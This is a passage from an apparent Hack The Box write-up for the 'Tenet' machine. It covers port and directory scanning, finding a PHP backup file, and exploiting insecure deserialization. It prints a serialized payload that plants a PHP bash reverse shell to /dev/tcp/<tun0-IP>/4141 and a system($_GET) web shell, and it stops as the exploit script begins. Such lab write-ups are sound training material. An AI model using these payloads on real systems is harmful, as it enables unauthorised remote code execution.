<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox - Tenet" /><meta property="og:locale" content="en" /><meta name="description" content="Just another hackthebox writeups website powered by poorduck" /><meta property="og:description" content="Just another hackthebox writeups website powered by poorduck" /><link rel="canonical" href="https://x00tex.github.io/posts/tenet/" /><meta property="og:url" content="https://x00tex.github.io/posts/tenet/" /><meta property="og:site_name" content="Poorduck" /><meta property="og:image" content="https://x00tex.github.io/assets/img/posts/tenet/tenet_banner.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-16T18:30:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://x00tex.github.io/assets/img/posts/tenet/tenet_banner.png" /><meta property="twitter:title" content="Hackthebox - Tenet" /><meta name="twitter:site" content="@p00rduck" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-01-16T18:30:00+00:00","datePublished":"2021-01-16T18:30:00+00:00","description":"Just another hackthebox writeups website powered by poorduck","headline":"Hackthebox - Tenet","image":"https://x00tex.github.io/assets/img/posts/tenet/tenet_banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://x00tex.github.io/posts/tenet/"},"url":"https://x00tex.github.io/posts/tenet/"}</script><title>Hackthebox - Tenet | Poorduck</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Poorduck"><meta name="application-name" content="Poorduck"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/poorduck.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Poorduck</a></div><div class="site-subtitle font-italic">Kwak kwak</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/x00tex" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/p00rduck" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['x00tex-writeups.3us6n','simplelogin.co'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox - Tenet</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox - Tenet</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/p00rduck">p00rduck</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1610821800" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2021-01-16 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2269 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="/assets/img/posts/tenet/tenet_banner.png" alt="" data-proofer-ignore></p><p align="right"> <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" data-src="https://www.hackthebox.eu/badge/image/391067" data-proofer-ignore></a></p><h1 id="scanning">Scanning</h1><h2 id="rustscannmap"><span class="mr-2">Rustscan/nmap</span><a href="#rustscannmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><code class="language-plaintext highlighter-rouge">rustscan -a 10.10.10.223 -r 1-65535 -- -A -sC -sV -oN - &gt; tenet.nmap</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre>❯ <span class="nb">cat </span>tenet.nmap
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| <span class="o">{}</span>  <span class="o">}</span>| <span class="o">{</span> <span class="o">}</span> |<span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span>|  <span class="sb">`</span>| |
| .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> |.-._<span class="o">}</span> <span class="o">}</span> | |  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> |<span class="se">\ </span> |
<span class="sb">`</span>-<span class="s1">' `-'</span><span class="sb">`</span><span class="nt">-----</span><span class="s1">'`----'</span>  <span class="sb">`</span>-<span class="s1">'  `----'</span>  <span class="sb">`</span><span class="nt">---</span><span class="s1">' `-'</span>  <span class="sb">`</span>-<span class="s1">'`-'</span> <span class="sb">`</span>-<span class="s1">'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '</span><span class="nt">-b</span> 1048476<span class="s1">'.
Open 10.10.10.223:22
Open 10.10.10.223:80
[~] Starting Script(s)
[&gt;] Script to be run Some("nmap -vvv -p  ")

[~] # Nmap 7.80 scan initiated Sun Jan 17 07:22:47 2021 as: nmap -vvv -p 22,80 -A -sC -sV -oN - 10.10.10.223
Nmap scan report for 10.10.10.223
Host is up, received conn-refused (0.55s latency).
Scanned at 2021-01-17 07:22:47 UTC for 43s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA4SymrtoAxhSnm6gIUPFcp1VhjoVue64X4LIvoYolM5BQPblUj2aezdd9aRI227jVzfkOD4Kg3OW2yT5uxFljn7q/Mh5/muGvUNA+nNO6pCC0tZPoPEwMT+QvR3XyQXxbP6povh4GISBySLw/DFQoG3A2t80Giyq5Q7P+1LH1f/m63DyiNXOPS8fNBPz59BDEgC9jJ5Lu2DTu8ko1xE/85MLYyBKRSFHEkqagRXIYUwVQASHgo3OoJ+VAcBTJZH1TmXDc4c6W0hIPpQW5dyvj3tdjKjlIkw6dH2at9NL3gnTP5xnsoiOu0dyofm2L5fvBpzvOzUnQ2rps2wANTZwZ
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMM1BQpjspHo9teJwTFZntx+nxj8D51/Nu0nI3atUpyPg/bXlNYi26boH8zYTrC6fWepgaG2GZigAqxN4yuwgo=
|   256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQeNqzXOE6aVR3ulHIyB8EGf1ZaUSCNuou5+cgmNXvt
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></pre></table></code></div></div><ul><li>Only 2 ports are available one is ssh and second is apache web_server.<li>port 80 has default apache web page.</ul><h2 id="gobuster"><span class="mr-2">Gobuster</span><a href="#gobuster" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><code class="language-plaintext highlighter-rouge">gobuster dir -u 10.10.10.223 -w ~/git-tools/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,txt -o tenet.out -t 100</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>/users.txt            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7]
/wordpress            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.223/wordpress/]
</pre></table></code></div></div><ul><li><p>Running gobuster found wordpress and user.txt but user.txt file only shows <code class="language-plaintext highlighter-rouge">Success</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ curl 10.10.10.223/users.txt
Success
</pre></table></code></div></div><li><p>move on to wordpress, I ran wpscan on wordpress but there is nothing interesting in the wpsacn result and the wordpress version is <code class="language-plaintext highlighter-rouge">5.6</code> UP-TO-DATE.</p></ul><h1 id="footholdphp_object-injection">Foothold:php_object-injection</h1><ul><li><p>after a while i found a comment <code class="language-plaintext highlighter-rouge">http://tenet.htb/index.php/2020/12/16/logs/#comment-2</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
</pre></table></code></div></div><li>comment is talking about some php file <code class="language-plaintext highlighter-rouge">sator.php</code> and its backup <em>normally file backups in linux stores with <code class="language-plaintext highlighter-rouge">.bak</code> extension.</em><li>after a while i found the file<ul><li><p><em>i do some crazy terminal tricks and create a one liner to generate a list of possible locations on the server</em>, but hey, i’m learning so that’s good for practice.</p><p><code class="language-plaintext highlighter-rouge">ffuf -u http://10.10.10.223/wordpress/FUZZ -w ~/git-tools/SecLists/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt:FUZZ -s | rev | cut -d/ -f2- | rev | sort | uniq | sed 's/^/wordpress/; s/$/\/sator.php/' | sed '1 i\sator.php' &gt; find_sator.txt &amp;&amp; gobuster dir -u http://10.10.10.223/ -w find_sator.txt -x bak &amp;&amp; rm find_sator.txt</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.223/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                find_sator.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              bak
[+] Timeout:                 10s
===============================================================
2021/01/17 17:02:49 Starting gobuster in directory enumeration mode
===============================================================
/sator.php            (Status: 200) [Size: 63]
/sator.php.bak        (Status: 200) [Size: 514]

===============================================================
2021/01/17 17:02:53 Finished
===============================================================
</pre></table></code></div></div></ul><li>ok, So i found the <code class="language-plaintext highlighter-rouge">sator.php</code> location and the backup file.<li><p>curl http://10.10.10.223/sator.php and there is nothing -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>❯ curl http://10.10.10.223/sator.php
[+] Grabbing users from text file &lt;br&gt;
[] Database updated &lt;br&gt;
</pre></table></code></div></div><li>review backup file to understand what <code class="language-plaintext highlighter-rouge">sator.php</code> file doing in the background -</ul><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">DatabaseExport</span>
<span class="p">{</span>
	<span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'users.txt'</span><span class="p">;</span>
	<span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>

	<span class="k">public</span> <span class="k">function</span> <span class="n">update_db</span><span class="p">()</span>
	<span class="p">{</span>
		<span class="k">echo</span> <span class="s1">'[+] Grabbing users from text file &lt;br&gt;'</span><span class="p">;</span>
		<span class="nv">$this</span><span class="o">-&gt;</span> <span class="n">data</span> <span class="o">=</span> <span class="s1">'Success'</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
	<span class="p">{</span>
		<span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nv">$this</span> <span class="o">-&gt;</span><span class="n">user_file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
		<span class="k">echo</span> <span class="s1">'[] Database updated &lt;br&gt;'</span><span class="p">;</span>
	<span class="c1">//	echo 'Gotta get this working properly...';</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'arepo'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$databaseupdate</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>

<span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DatabaseExport</span><span class="p">;</span>
<span class="nv">$app</span> <span class="o">-&gt;</span> <span class="nf">update_db</span><span class="p">();</span>

<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>if we serialize <code class="language-plaintext highlighter-rouge">DatabaseExport</code> class as a new <code class="language-plaintext highlighter-rouge">DatabaseExport</code> object -</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="kd">class</span> <span class="nc">DatabaseExport</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'poorduck.php'</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">'&lt;?php exec("/bin/bash -c \'bash -i &gt; /dev/tcp/&lt;tun0-IP&gt;/4141 0&gt;&amp;1\'"); ?&gt;'</span><span class="p">;</span>

<span class="p">}</span>
<span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nc">DatabaseExport</span><span class="p">)</span>

<span class="cp">?&gt;</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">O:14:"DatabaseExport":2:{s:9:"user_file";s:8:"hush.php";s:4:"data";s:33:"&lt;?php exec("/bin/bash -c \'bash -i &gt; /dev/tcp/&lt;tun0-IP&gt;/4141 0&gt;&amp;1\'"); ?&gt;";}</code></p><p><strong>unserialize data:</strong></p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>__PHP_Incomplete_Class Object
(
    [__PHP_Incomplete_Class_Name] =&gt; DatabaseExport
    [user_file] =&gt; hush.php
    [data] =&gt; <span class="cp">&lt;?php</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">"/bin/bash -c \'bash -i &gt; /dev/tcp/&lt;tun0-IP&gt;/4141 0&gt;&amp;1\'"</span><span class="p">);</span> <span class="cp">?&gt;</span>
)
</pre></table></code></div></div><p>so when this unserialize data run in the script it creats new <code class="language-plaintext highlighter-rouge">DatabaseExport</code> object from that class and now the script run with two DatabaseExport objects and with the <code class="language-plaintext highlighter-rouge">user.txt</code> file our <code class="language-plaintext highlighter-rouge">shell.php</code> also created.</p><p>so on behalf of the DatabaseExport class two new <code class="language-plaintext highlighter-rouge">DatabaseExport</code> objects created -</p><p><strong>First:</strong></p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$databaseupdate</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span> <span class="o">-&gt;</span> <span class="k">new</span> <span class="nc">DatabaseExport</span><span class="p">;</span>
</pre></table></code></div></div><p><strong>Second:</strong></p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DatabaseExport</span><span class="p">;</span>
<span class="nv">$app</span> <span class="o">-&gt;</span> <span class="nf">update_db</span><span class="p">();</span>
</pre></table></code></div></div><p>where <code class="language-plaintext highlighter-rouge">$databaseupdate</code> contains</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">DatabaseExport</span>
<span class="p">{</span>
	<span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'shell.php'</span><span class="p">;</span>
	<span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">'&lt;?php echo system($_GET["x"]); ?&gt;'</span><span class="p">;</span>

	<span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
	<span class="p">{</span>
		<span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nv">$this</span> <span class="o">-&gt;</span><span class="n">user_file</span> <span class="o">==&gt;</span> <span class="s1">'shell.php'</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">==&gt;</span> <span class="s1">'&lt;?php exec("/bin/bash -c \'bash -i &gt; /dev/tcp/&lt;tun0-IP&gt;/4141 0&gt;&amp;1\'"); ?&gt;'</span><span class="p">);</span>
		<span class="k">echo</span> <span class="s1">'[] Database updated &lt;br&gt;'</span><span class="p">;</span>
	<span class="c1">//	echo 'Gotta get this working properly...';</span>
	<span class="p">}</span>
<span class="p">}</span>

</pre></table></code></div></div><p>and <code class="language-plaintext highlighter-rouge">$app</code> contains</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">DatabaseExport</span>
<span class="p">{</span>
	<span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'users.txt'</span><span class="p">;</span>
	<span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>

	<span class="k">public</span> <span class="k">function</span> <span class="n">update_db</span><span class="p">()</span>
	<span class="p">{</span>
		<span class="k">echo</span> <span class="s1">'[+] Grabbing users from text file &lt;br&gt;'</span><span class="p">;</span>
		<span class="nv">$this</span><span class="o">-&gt;</span> <span class="n">data</span> <span class="o">=</span> <span class="s1">'Success'</span><span class="p">;</span>
	<span class="p">}</span>


	<span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
	<span class="p">{</span>
		<span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nv">$this</span> <span class="o">-&gt;</span><span class="n">user_file</span> <span class="o">==&gt;</span> <span class="s1">'users.txt'</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">==&gt;</span> <span class="s1">''</span><span class="p">);</span>
		<span class="k">echo</span> <span class="s1">'[] Database updated &lt;br&gt;'</span><span class="p">;</span>
	<span class="c1">//	echo 'Gotta get this working properly...';</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>and <code class="language-plaintext highlighter-rouge">update_db()</code> function is exec in this object because <code class="language-plaintext highlighter-rouge">$app</code> is calling it with <code class="language-plaintext highlighter-rouge">$app -&gt; update_db();</code></p><p>and <code class="language-plaintext highlighter-rouge">__destruct()</code> is the <a href="https://www.php.net/manual/en/language.oop5.magic.php">magic method</a> and “The destructor method will be called as soon as there are no other references to a particular object.”</p><p><strong>Reference:</strong></p><ul><li>ExploitDB documentation on <a href="https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf">deserialization-vulnerability</a><li>ippsec Video on <a href="https://www.youtube.com/watch?v=HaW15aMzBUM&amp;list=PLidcsTyj9JXJrgTzRYdwnUhUThb9bL9py&amp;index=2">PHP Deserialization</a><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md">PayloadsAllTheThings</a><li><a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">medium article</a><li>phpgcc tool <a href="https://github.com/ambionics/phpggc">ambionics@github</a></ul><h1 id="user-exploit">User Exploit</h1><p>and here is the final automate script for exploiting this vulnerability -</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
